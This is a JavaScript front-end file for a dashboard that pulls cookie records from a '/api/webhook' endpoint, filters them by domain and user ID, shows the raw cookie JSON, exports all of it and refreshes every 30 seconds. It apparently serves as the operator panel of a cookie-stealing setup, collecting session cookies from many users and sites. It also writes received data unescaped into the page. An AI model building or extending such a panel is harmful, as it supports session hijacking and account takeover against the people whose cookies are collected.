let currentCookies = [];
let domainFilter = '';
let userFilter = '';
let searchQuery = '';

// DOM Elements
const webhookList = document.getElementById('webhookList');
const modal = document.getElementById('cookieModal');
const jsonContent = document.getElementById('jsonContent');
const copyJson = document.getElementById('copyJson');
const closeModal = document.getElementById('closeModal');
const copiedToast = document.getElementById('copiedToast');
const refreshBtn = document.getElementById('refreshBtn');
const searchInput = document.getElementById('searchInput');
const domainFilterSelect = document.getElementById('domainFilter');
const userFilterSelect = document.getElementById('userFilter');
const totalCookiesElement = document.getElementById('totalCookies');
const activeDomainsElement = document.getElementById('activeDomains');
const clearDataBtn = document.getElementById('clearData');
const exportDataBtn = document.getElementById('exportData');

// Fetch cookies from the API
async function fetchCookies() {
    try {
        const response = await fetch('/api/webhook');
        const data = await response.json();
        currentCookies = data;
        updateFilters();
        renderCookies();
        updateStats();
    } catch (error) {
        console.error('Error fetching cookies:', error);
    }
}

// Update filter options
function updateFilters() {
    const domains = [...new Set(currentCookies.map(item => item.body.url || 'Unknown Domain'))];
    const users = [...new Set(currentCookies.map(item => item.userId))];

    // Update domain filter
    const currentDomain = domainFilterSelect.value;
    domainFilterSelect.innerHTML = '<option value="">All Domains</option>' +
        domains.map(domain => `<option value="${domain}" ${domain === currentDomain ? 'selected' : ''}>${domain}</option>`).join('');

    // Update user filter
    const currentUser = userFilterSelect.value;
    userFilterSelect.innerHTML = '<option value="">All Users</option>' +
        users.map(user => `<option value="${user}" ${user === currentUser ? 'selected' : ''}>${user}</option>`).join('');
}

// Update statistics
function updateStats() {
    const filteredCookies = getFilteredCookies();
    const totalCookies = filteredCookies.reduce((sum, item) => sum + item.cookieCount, 0);
    const domains = new Set(filteredCookies.map(item => item.body.url || 'Unknown Domain'));

    totalCookiesElement.textContent = totalCookies;
    activeDomainsElement.textContent = domains.size;
}

// Get filtered cookies based on current filters and search
function getFilteredCookies() {
    return currentCookies.filter(item => {
        const matchesDomain = !domainFilter || item.body.url === domainFilter;
        const matchesUser = !userFilter || item.userId === userFilter;
        const matchesSearch = !searchQuery || 
            item.body.url.toLowerCase().includes(searchQuery.toLowerCase()) ||
            item.userId.toString().includes(searchQuery);
        return matchesDomain && matchesUser && matchesSearch;
    });
}

// Render cookies to the list
function renderCookies() {
    const filteredCookies = getFilteredCookies();
    
    webhookList.innerHTML = filteredCookies.map(item => `
        <div class="webhook-item" onclick="showCookieDetails(${item.id})">
            <div class="webhook-header">
                <div class="domain-name">
                    <span class="material-icons">public</span>
                    ${item.body.url || 'Unknown Domain'}
                </div>
                <div class="webhook-time">
                    ${new Date(item.time).toLocaleString()}
                </div>
            </div>
            <div class="webhook-info">
                <div class="info-item">
                    <span class="material-icons">cookie</span>
                    ${item.cookieCount} cookies
                </div>
                <div class="info-item">
                    <span class="material-icons">person</span>
                    User ID: ${item.userId}
                </div>
            </div>
        </div>
    `).join('');
}

// Show cookie details in modal
function showCookieDetails(id) {
    const cookie = currentCookies.find(c => c.id === id);
    if (!cookie) return;

    jsonContent.textContent = JSON.stringify(cookie, null, 2);
    modal.style.display = 'block';
}

// Event Listeners
copyJson.addEventListener('click', () => {
    navigator.clipboard.writeText(jsonContent.textContent).then(() => {
        copiedToast.style.display = 'block';
        setTimeout(() => {
            copiedToast.style.display = 'none';
        }, 2000);
    });
});

closeModal.addEventListener('click', () => {
    modal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === modal) {
        modal.style.display = 'none';
    }
});

refreshBtn.addEventListener('click', fetchCookies);

searchInput.addEventListener('input', (e) => {
    searchQuery = e.target.value;
    renderCookies();
    updateStats();
});

domainFilterSelect.addEventListener('change', (e) => {
    domainFilter = e.target.value;
    renderCookies();
    updateStats();
});

userFilterSelect.addEventListener('change', (e) => {
    userFilter = e.target.value;
    renderCookies();
    updateStats();
});

clearDataBtn.addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all data?')) {
        try {
            await fetch('/api/webhook', { method: 'DELETE' });
            currentCookies = [];
            renderCookies();
            updateStats();
            updateFilters();
        } catch (error) {
            console.error('Error clearing data:', error);
        }
    }
});

exportDataBtn.addEventListener('click', () => {
    const dataStr = JSON.stringify(currentCookies, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cookie-data-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
});

// Make showCookieDetails available globally
window.showCookieDetails = showCookieDetails;

// Initial load
fetchCookies();

// Auto refresh every 30 seconds
setInterval(fetchCookies, 30000); 